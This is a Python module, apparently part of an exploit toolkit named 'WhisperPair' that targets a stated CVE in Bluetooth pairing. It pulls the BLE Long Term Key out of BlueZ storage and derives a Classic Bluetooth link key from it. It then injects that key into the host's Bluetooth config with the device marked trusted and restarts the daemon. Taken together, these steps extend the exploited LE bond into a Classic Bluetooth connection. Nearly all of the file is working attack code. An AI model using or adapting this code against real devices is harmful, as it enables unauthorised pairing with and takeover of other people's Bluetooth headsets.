"""
Cross-Transport Key Derivation (CTKD) for WhisperPair

Derives a BR/EDR Link Key from a BLE Long Term Key (LTK) per
Bluetooth Core Spec Vol 3, Part H, Section 2.4.2.5.

This allows the laptop to create a Classic BT bond from the LE bond
established during the CVE-2025-36911 exploit, without needing the
device to be in Classic BT pairing mode.

Flow:
  1. Pair via BLE (exploit does KBP + creates LE bond)
  2. Extract LTK from bluez config
  3. Derive BR/EDR Link Key via h6(h7(SALT, LTK), keyID)
  4. Inject Link Key into bluez config for the BR/EDR address
  5. Restart bluetoothd
  6. Connect via Classic BT using the derived key

Crypto constants per BT Core Spec v5.x, Vol 3, Part H, Section 2.4.2.5:
  SALT  = 0x000000000000000000000000746D7032  ("tmp2" in last 4 bytes)
  keyID = 0x6C6B3265                          ("lk2e" — Link Key to LE)
"""

import os
import configparser
import subprocess
import glob

from cryptography.hazmat.primitives import cmac
from cryptography.hazmat.primitives.ciphers import algorithms

# BT Core Spec v5.x, Vol 3, Part H, Section 2.4.2.5
CTKD_SALT = bytes.fromhex("000000000000000000000000746D7032")  # 128-bit, "tmp2"
CTKD_KEY_ID = bytes.fromhex("6C6B3265")                        # 32-bit, "lk2e"


def aes_cmac(key: bytes, message: bytes) -> bytes:
    """AES-CMAC per RFC 4493."""
    c = cmac.CMAC(algorithms.AES(key))
    c.update(message)
    return c.finalize()


def h7(salt: bytes, w: bytes) -> bytes:
    """h7(SALT, W) = AES-CMAC_SALT(W)
    BT Core Spec Vol 3, Part H, Section 2.2.8.
    Salt must be 16 bytes (128-bit)."""
    assert len(salt) == 16, f"h7 salt must be 16 bytes, got {len(salt)}"
    return aes_cmac(salt, w)


def h6(w: bytes, key_id: bytes) -> bytes:
    """h6(W, keyID) = AES-CMAC_W(keyID)
    BT Core Spec Vol 3, Part H, Section 2.2.7.
    keyID must be 4 bytes (32-bit)."""
    assert len(key_id) == 4, f"h6 keyID must be 4 bytes, got {len(key_id)}"
    return aes_cmac(w, key_id)


def derive_link_key(ltk: bytes) -> bytes:
    """Derive BR/EDR Link Key from LE LTK via CTKD.

    Per BT Core Spec Vol 3, Part H, Section 2.4.2.5:
      ILK = h7(SALT, LTK)
      Link_Key = h6(ILK, keyID)

    Where SALT = 0x...746D7032 and keyID = 0x6C6B3265.
    """
    ilk = h7(CTKD_SALT, ltk)
    return h6(ilk, CTKD_KEY_ID)


def find_adapter_address():
    """Find the local Bluetooth adapter address from bluez storage."""
    bt_dir = "/var/lib/bluetooth"
    if not os.path.isdir(bt_dir):
        return None
    for entry in os.listdir(bt_dir):
        if ":" in entry and len(entry) == 17:
            return entry
    return None


def find_le_device(adapter_addr, ble_address=None, device_name_hint=None):
    """Find an LE-paired device in bluez storage and return (path, address, info).

    Search priority:
      1. Exact BLE address match (most reliable)
      2. Device name substring match (fallback)
    """
    base = f"/var/lib/bluetooth/{adapter_addr}"
    if not os.path.isdir(base):
        return None, None, None

    # If we have a BLE address, try exact match first
    if ble_address:
        # BlueZ stores addresses with colons replaced by underscores in some cases,
        # but directory names use colons (e.g. AA:BB:CC:DD:EE:FF)
        addr_normalized = ble_address.upper().replace("_", ":")
        for dev_dir in os.listdir(base):
            if dev_dir.upper() == addr_normalized:
                info_path = os.path.join(base, dev_dir, "info")
                if not os.path.isfile(info_path):
                    continue
                config = configparser.ConfigParser()
                config.read(info_path)
                if config.has_section("LongTermKey"):
                    return info_path, dev_dir, config

    # Fallback: name-based search
    for dev_dir in os.listdir(base):
        info_path = os.path.join(base, dev_dir, "info")
        if not os.path.isfile(info_path):
            continue

        config = configparser.ConfigParser()
        config.read(info_path)

        if not config.has_section("LongTermKey"):
            continue

        name = config.get("General", "Name", fallback="")
        if device_name_hint and device_name_hint.lower() not in name.lower():
            continue

        return info_path, dev_dir, config

    return None, None, None


def extract_ltk(config):
    """Extract the Long Term Key from a bluez device info config."""
    if not config.has_section("LongTermKey"):
        return None
    key_hex = config.get("LongTermKey", "Key", fallback=None)
    if not key_hex:
        return None
    return bytes.fromhex(key_hex)


def check_ctkd_prerequisites(config):
    """Check if LE pairing used Secure Connections (required for CTKD).

    Returns (ok, details_dict) where details_dict has:
      - secure_connections: bool
      - authenticated: bool (MITM protection used)
      - enc_size: int
    """
    details = {
        "secure_connections": False,
        "authenticated": False,
        "enc_size": 0,
    }

    if not config.has_section("LongTermKey"):
        return False, details

    # BlueZ LongTermKey Type: 1 = unauthenticated SC, 2 = authenticated SC
    # Legacy pairing: Type 0 = unauthenticated, no SC
    key_type = config.getint("LongTermKey", "Type", fallback=-1)
    details["secure_connections"] = key_type in (1, 2)
    details["authenticated"] = key_type == 2
    details["enc_size"] = config.getint("LongTermKey", "EncSize", fallback=0)

    return details["secure_connections"], details


def inject_link_key(adapter_addr, bredr_address, link_key, device_name="Unknown",
                    authenticated=False):
    """Write a BR/EDR Link Key into bluez's storage for the given address.

    Creates or updates /var/lib/bluetooth/<adapter>/<bredr_addr>/info
    with the derived link key.

    Key types per BT Core Spec:
      4 = Authenticated P-256 combination key (LE SC with MITM)
      5 = Unauthenticated P-256 combination key (LE SC, Just Works)
    """
    bredr_dir = bredr_address.upper()
    base = f"/var/lib/bluetooth/{adapter_addr}/{bredr_dir}"
    info_path = os.path.join(base, "info")

    os.makedirs(base, exist_ok=True)

    config = configparser.ConfigParser()
    if os.path.exists(info_path):
        config.read(info_path)

    if not config.has_section("General"):
        config.add_section("General")
    config.set("General", "Name", device_name)
    config.set("General", "Class", "0x240404")  # Audio device
    config.set("General", "AddressType", "public")
    config.set("General", "SupportedTechnologies", "BR/EDR;")
    config.set("General", "Trusted", "true")
    config.set("General", "Blocked", "false")

    if not config.has_section("LinkKey"):
        config.add_section("LinkKey")
    config.set("LinkKey", "Key", link_key.hex().upper())
    # Type 4 = authenticated combination (SC + MITM)
    # Type 5 = unauthenticated combination (SC, Just Works)
    key_type = "4" if authenticated else "5"
    config.set("LinkKey", "Type", key_type)
    config.set("LinkKey", "PINLength", "0")

    with open(info_path, "w") as f:
        config.write(f)

    return info_path


def perform_ctkd(bredr_address, ble_address=None, device_name_hint=None,
                 device_name="Unknown"):
    """Full CTKD flow:
    1. Find the LE device in bluez storage (by address or name)
    2. Validate CTKD prerequisites (LE Secure Connections)
    3. Extract LTK
    4. Derive BR/EDR Link Key
    5. Inject into bluez storage with correct key type
    6. Restart bluetoothd

    Args:
        bredr_address: Target BR/EDR MAC address for Classic BT
        ble_address: BLE MAC address of the paired device (preferred lookup)
        device_name_hint: Substring to match device name in BlueZ storage (fallback)
        device_name: Friendly name to store in the BR/EDR info file

    Returns (success, message, link_key_hex)
    """
    adapter = find_adapter_address()
    if not adapter:
        return False, "No Bluetooth adapter found in /var/lib/bluetooth", None

    # Find the LE device — prefer address match, fall back to name
    info_path, dev_addr, config = find_le_device(
        adapter, ble_address=ble_address, device_name_hint=device_name_hint
    )
    if not config:
        search_desc = ble_address or device_name_hint or "(no hint)"
        return False, f"No LE-paired device found for '{search_desc}'", None

    # Validate CTKD prerequisites
    sc_ok, sc_details = check_ctkd_prerequisites(config)
    if not sc_ok:
        return (
            False,
            f"CTKD requires LE Secure Connections but device {dev_addr} used legacy "
            f"pairing (LTK type={config.getint('LongTermKey', 'Type', fallback=-1)}). "
            f"CTKD cannot derive a valid BR/EDR Link Key from a legacy LTK.",
            None,
        )

    # Extract LTK
    ltk = extract_ltk(config)
    if not ltk:
        return False, f"No LTK found for {dev_addr}", None

    # Derive Link Key
    link_key = derive_link_key(ltk)

    # Inject into bluez storage with correct key type
    authenticated = sc_details["authenticated"]
    injected_path = inject_link_key(
        adapter, bredr_address, link_key,
        device_name=device_name, authenticated=authenticated,
    )

    # Restart bluetoothd to pick up new key.
    # Wait for the daemon to fully initialize by polling adapter availability.
    subprocess.run(["systemctl", "restart", "bluetooth"], capture_output=True, timeout=10)

    import time
    for _ in range(10):
        time.sleep(1)
        r = subprocess.run(
            ["bluetoothctl", "show"],
            capture_output=True, text=True, timeout=5,
        )
        if "Powered: yes" in r.stdout:
            break
    else:
        # Give it a final moment even if we didn't see Powered: yes
        time.sleep(2)

    key_type_str = "authenticated" if authenticated else "unauthenticated"
    return (
        True,
        f"CTKD complete. LTK={ltk.hex()}, LinkKey={link_key.hex()} "
        f"({key_type_str}), written to {injected_path}",
        link_key.hex(),
    )


if __name__ == "__main__":
    import sys
    if len(sys.argv) < 2:
        print("Usage: python ctkd.py <bredr_address> [ble_address] [device_name_hint]")
        print("Example: python ctkd.py 00:A4:1C:A0:35:FE AA:BB:CC:DD:EE:FF WF-C510")
        sys.exit(1)

    bredr = sys.argv[1]
    ble = sys.argv[2] if len(sys.argv) > 2 else None
    hint = sys.argv[3] if len(sys.argv) > 3 else None

    success, msg, key = perform_ctkd(bredr, ble_address=ble, device_name_hint=hint)
    print(msg)
    if success:
        print(f"\nNow try: bluetoothctl connect {bredr}")
